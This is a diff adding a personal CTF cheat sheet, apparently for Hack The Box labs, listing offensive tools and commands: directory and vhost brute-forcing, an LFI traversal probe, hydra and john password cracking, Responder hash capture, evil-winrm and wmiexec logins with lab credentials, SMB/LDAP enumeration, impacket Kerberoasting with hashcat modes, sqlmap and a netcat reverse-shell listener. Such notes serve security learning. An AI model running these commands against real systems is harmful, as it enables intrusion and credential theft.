@@ -1,0 +1,148 @@
+<h5>List of tools I used so far for CTFs.</h5>
+<h3>Types of Cyberattacks</h3>
+<ul>
+<li>Return Oriented Programming (ROP)</li>
+<li>Local File Inclusion / Remote File Inclusion</li>
+<li>SQL Injection</li>
+<li>Blind SQL Injection - testing for sql injection on target wont show the query results however still can be exploitable.</li>
+<li>Privilige Escalation</li>
+<li>Reverse shell: misconfiguration, SQL, Apache..</li>
+<li>Directory Busting - identify possible hidden directories in websites, hidden endpoints, forgotten pages not used. </li>
+<li>SSTI (Server Side Template Injection) - injecting template payloads.</li>
+<li>XSS Cross Site Scripting - injecting malicious JS into trusted websites.</li>
+</ul>
+<h3>Template Engines</h3>
+<ul>
+<li>Handlebars templates for JS.</li>
+<li>Jinja2 Python.</li>
+</ul>
+<h2>Web</h2>
+<h3>Tools:</h3>
+<ul>
+<li>BurpSuite</li>
+<li>Wappalyzer - browser extension that analyzes webpage code and returns the technologies used to build it.</li>
+<li>GoBuster/Feroxbuster - enumerating hidden, undocumented, misconfigured assets, accesible without authentication</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Directory brute-force</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>--url<span class="w"> </span>http://10.129.44.135<span class="w"> </span>--wordlist<span class="w"> </span>SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt<span class="w"> </span>-x<span class="w"> </span>php,html
+gobuster<span class="w"> </span>dir<span class="w"> </span>--url<span class="w"> </span>http://10.129.195.114/<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt
+<span class="c1"># VHosts brute-force</span>
+gobuster<span class="w"> </span>vhost<span class="w"> </span>--append-domain<span class="w"> </span>-w<span class="w"> </span>SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span>-u<span class="w"> </span><span class="m">10</span>.129.44.135
+<span class="c1"># LFI testing</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.48<span class="w"> </span>http://unika.htb/index.php?page<span class="o">=</span>../../../../../../../../windows/system32/drivers/etc/hosts<span class="w"> </span>LFI<span class="w"> </span>vulnerable?
+<span class="c1"># Fuzzing, inputing invalid, unexpected, random data to find bugs,vulnerabilites and crash the program.</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://94.237.56.99:34919/FUZZ&quot;</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+<span class="c1"># HTTP requests</span>
+curl<span class="w"> </span>-v<span class="w"> </span>http://10.129.1.27/<span class="w">  </span>//<span class="w"> </span>HTTP<span class="w"> </span>request
+<span class="c1"># Bypass DNS resolution - resolve domain to IP on port 80 during curl request bypassing DNS resolution.</span>
+curl<span class="w"> </span>--resolve<span class="w"> </span><span class="s1">&#39;ignition.htb:80:10.129.1.27&#39;</span><span class="w"> </span>http://ignition.htb/
+</code></pre></div>
+
+<h2>Passwords / hashes</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Identify hash type</span>
+hashid
+<span class="c1"># Extract hash from zip</span>
+zip2john<span class="w"> </span>backup.zip<span class="w"> </span>&gt;<span class="w"> </span>file.hash
+<span class="c1"># Crack hash with john</span>
+john<span class="w"> </span>--encoding<span class="o">=</span>ASCII<span class="w"> </span>-w<span class="o">=</span>/usr/share/john/filezilla2john.py<span class="w"> </span>backup.zip
+john<span class="w"> </span>-w<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>file.hash
+<span class="c1"># Hydra brute force tool for cracking passwords</span>
+hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span><span class="m">10</span>.129.254.38<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/j_spring_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:C=/login:Invalid&quot;</span><span class="w"> </span>-s<span class="w"> </span><span class="m">8080</span><span class="w"> </span>-vadmin/:login%5Busername%5D<span class="o">=</span>^USER^<span class="p">&amp;</span>login%5Bpassword%5D<span class="o">=</span>^PASS^:Incorrect<span class="s2">&quot;</span>
+</code></pre></div>
+
+<h2>Forensics</h2>
+<h3>Tools:</h3>
+<ul>
+<li>zsteg</li>
+<li>Volatility3 - extracting digital artifacts such as memory dump</li>
+<li>exiftool</li>
+<li>hexdump / xxd / bvi</li>
+<li>pwntools</li>
+<li>SecLists - collection of lists usernames, passwords, patterns, payloads and more</li>
+<li>impacket - python classes for working with network protocols, NTLM, SMB, Kerberos and many more</li>
+<li>FreeRDP X11 client  - FreeRDP X11 client to windows</li>
+<li>setoolkit - different pentesting toolkit attacks: websites, wireless, spear-phishing....</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>python3<span class="w"> </span>vol.py<span class="w"> </span>-f<span class="w"> </span>flounder-pc-memdump.elf<span class="w"> </span>-p<span class="w"> </span>plugin<span class="w"> </span>windows.netscan
+python3<span class="w">  </span>impacket/examples/mssqlclient.py<span class="w"> </span>ARCHETYPE/sql_svc@10.129.208.89<span class="w"> </span>-windows-auth
+<span class="c1"># Responder - (MITM / hash capture) authentication methods, capture hashes and authentication methods in the background, NTLM, acts similar to MITM if target tries to authenticate responder acts as the user.</span>
+python3<span class="w"> </span>Responder.py<span class="w"> </span>-I<span class="w"> </span>tun0
+<span class="c1"># Evil-WinRM shell - Linux no PowerShell(WinRM) ? evil-winrm shell to rescue</span>
+evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.136.91<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-p<span class="w"> </span>Password123
+<span class="c1"># RDP connection</span>
+xfreerdp<span class="w"> </span>/v:10.129.1.13<span class="w"> </span>/u:administrator
+<span class="c1"># WMI execution - windows management framework for task automation, performance monitoring and system info gathering</span>
+wmiexec.py<span class="w"> </span>active.htb/administrator:Ticketmaster1968@10.10.10.100<span class="w"> </span><span class="c1"># shell linux to win</span>
+</code></pre></div>
+
+<h2>Reverse Engineering</h2>
+<ul>
+<li>ROPgadget</li>
+<li>Ghidra / IDA (static analysis)</li>
+</ul>
+<h2>Hardware</h2>
+<ul>
+<li>Saleae Logic Analyzer (Logic2) - company that creates hardware debugging software, works by attaching probes to device and analyzing the binary output transmitted.</li>
+</ul>
+<h2>Databases / SMB / LDAP</h2>
+<ul>
+<li>MongoDB - NoSQL - mongo shell: databases-&gt;collections-&gt;documents-&gt;JSON format</li>
+<li>FTP - transfer files between network devices (SFTP|FTPS)</li>
+<li>Rsync - file transfer, connection + process receiver spawn -&gt; sender and receiver changes -&gt; only changes are updated.</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>rsync<span class="w"> </span>rsync://10.129.228.37/public/flag.txt<span class="w"> </span>.<span class="w"> </span><span class="p">|</span><span class="w"> </span>rsync<span class="w"> </span>--list-only<span class="w"> </span><span class="m">10</span>.129.228.37::
+<span class="c1"># SQLMap (SELECT * FROM users WHERE username=&#39;admin&#39;#&#39; AND password=&#39;a&#39;)</span>
+sqlmap<span class="w"> </span>-<span class="w"> </span>pentesting<span class="w"> </span>tool<span class="w"> </span>to<span class="w"> </span>detect<span class="w"> </span>and<span class="w"> </span>exploit<span class="w"> </span>sql<span class="w"> </span>injection<span class="w"> </span>flaws.
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;http://10.129.44.135/dashboard.php?search=any+query&#39;</span>
+<span class="c1"># MySQL</span>
+mysql<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.10.20.30<span class="w"> </span>-u<span class="w"> </span>root
+<span class="c1"># List SMB shares</span>
+smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">10</span>.129.30.50<span class="w"> </span><span class="p">|</span><span class="w"> </span>smbclient<span class="w"> </span><span class="se">\\\\</span><span class="m">10</span>.129.30.50<span class="se">\\</span>ADMIN$<span class="w"> </span><span class="p">|</span><span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>-U<span class="w"> </span>ARCHETYPE/sql_svc@10.129.174.162
+<span class="c1"># Access share</span>
+smbclient<span class="w"> </span>-U<span class="w"> </span><span class="o">[</span>Domain<span class="o">]</span>/<span class="o">[</span>User<span class="o">]</span>%<span class="o">[</span>Password<span class="o">]</span><span class="w"> </span>//10.10.10.100/Users
+smbmap<span class="w"> </span>-d<span class="w"> </span>active.htb<span class="w"> </span>-u<span class="w"> </span>SVC_TGS<span class="w"> </span>-p<span class="w"> </span>GPPstillStandingStrong2k18<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.10.100
+<span class="c1"># SMB enumeration</span>
+smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.10.100<span class="w"> </span><span class="c1"># identify which shares accessible with anonymous login</span>
+<span class="c1"># LDAP query</span>
+ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;ldap://10.10.10.100&#39;</span><span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;SVC_TGS&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;dc=active,dc=htb&quot;</span><span class="w"> </span>samaccountname<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>sAMAccountName
+ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.10.10.161:389<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;dc=htb,dc=local&quot;</span><span class="w"> </span><span class="c1"># check if ldap allows binding</span>
+ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.10.10.161:389<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;OU=Service Accounts,dc=htb,dc=local&quot;</span><span class="w"> </span><span class="c1"># search service accounts</span>
+<span class="c1"># Get domain users</span>
+GetADUsers.py<span class="w"> </span>-all<span class="w"> </span>active.htb/svc_tgs<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.100<span class="w"> </span><span class="c1"># impacket get domain user account</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="c1"># Kerberos attacks</span>
+<span class="c1"># GetUserSPNs when require Kerberos preauthentication exist, known password</span>
+GetUserSPNs.py<span class="w"> </span>active.htb/svc_tgs<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.100<span class="w"> </span>-request
+<span class="c1"># GetNPUsers No password -&gt; Queries target domain for users with &#39;Do not require Kerberos preauthentication&#39; set and export their TGTs for cracking</span>
+GetNPUsers.py<span class="w"> </span>htb.local/svc-alfresco<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.161<span class="w"> </span>-no-pass
+
+Kerberos-Hashcat:<span class="w"> </span>TGT<span class="w"> </span>Modes
+<span class="m">19600</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">17</span>,<span class="w"> </span>TGS-REP<span class="w">               </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">19800</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">17</span>,<span class="w"> </span>Pre-Auth<span class="w">              </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">28800</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">17</span>,<span class="w"> </span>DB<span class="w">                    </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">19700</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">18</span>,<span class="w"> </span>TGS-REP<span class="w">               </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">19900</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">18</span>,<span class="w"> </span>Pre-Auth<span class="w">              </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">28900</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">18</span>,<span class="w"> </span>DB<span class="w">                    </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">7500</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>AS-REQ<span class="w"> </span>Pre-Auth<span class="w">       </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">13100</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>TGS-REP<span class="w">               </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+<span class="m">18200</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>AS-REP
+</code></pre></div>
+
+<h2>Cloud</h2>
+<ul>
+<li>AWS S3 bucket cloud storage</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="c1"># List S3 bucket</span>
+aws<span class="w"> </span>--endpoint<span class="o">=</span>http://s3.thetoppers.htb<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://thetoppers.htb
+</code></pre></div>
+
+<h2>Networking</h2>
+<ul>
+<li>NetCat / SoCat (more powerfull) - reads data across network using TCP and UDP protocols.</li>
+<li>Socat (more advanced) - redirect incoming traffic at local port to specific port.</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+<span class="c1"># Fork session (child proccess), while parent process continues listening for new connections.</span>
+socat<span class="w"> </span>TCP-LISTEN:4444,fork<span class="w"> </span>TCP:target:4444
+</code></pre></div>
